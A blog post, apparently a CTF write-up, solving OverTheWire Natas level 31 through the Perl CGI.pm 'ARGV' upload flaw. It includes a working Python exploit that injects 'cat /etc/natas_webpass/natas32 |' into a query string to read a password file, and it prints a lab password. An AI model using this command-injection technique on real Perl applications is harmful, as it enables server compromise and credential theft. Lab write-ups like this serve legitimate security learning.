---
layout: post
title:  "Natas Level 30 â†’ Level 31"
date:   2021-06-08 02:13:09
categories: ctf wargames web-security
tags: wargames ctf overthewire web-security
series: "OverTheWire: Natas"
excerpt: From CGI.pm with love
mathjax: false
---

## Level Goal
Excluding the URL and username, the Level Goal section is blank for the Natas ctf.


## Solution
Logging into the natas31 site we see a form to allow us to log in and a link to the source code. Let's look at the source code.

```perl
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    ...
    while (<$file>) {
        ...
```

If you haven't seen [The Perl Jam 2: The Camel Strikes Back](https://www.youtube.com/watch?v=BYl3-c2JSL8) from BlackHat 2016, I'd recommend giving it a watch. You can jump to [17:13](https://youtu.be/BYl3-c2JSL8?t=1011) if you'd like to see the portion directly related to this level. The above code is nearly identical to the code from the video. 

I'll leave you to watch the video from at least 17:13 for an explanation of why this code is exploitable. 

Below is the Python code I used to solve this level.

```python
import re
import os.path
import requests
from requests.auth import HTTPBasicAuth

password = 'hay7aecuungiuKaezuathuk9biin0pu1'
session = requests.Session()

auth = HTTPBasicAuth('natas31', password)
url = 'http://natas31.natas.labs.overthewire.org/'
payload = url + '?cat /etc/natas_webpass/natas32 |'

if not os.path.exists('natas31.csv'):
    with open('natas31.csv', 'w') as f:
        f.write('temp,file')

csv = {'file': open('natas31.csv', 'rb')}

resp = requests.post(payload, files=csv, data={'file': 'ARGV', 'submit': 'Upload'}, auth=auth)
page = resp.text

if os.path.isfile('natas31.csv'):
    os.remove('natas31.csv')

x = re.findall("([a-zA-Z0-9]{32})", page)
print(x[-1])
```

This code creates a temporary .csv file needed to perform the attack. The file is deleted afterward. The password to the next level will be returned after the upload finishes.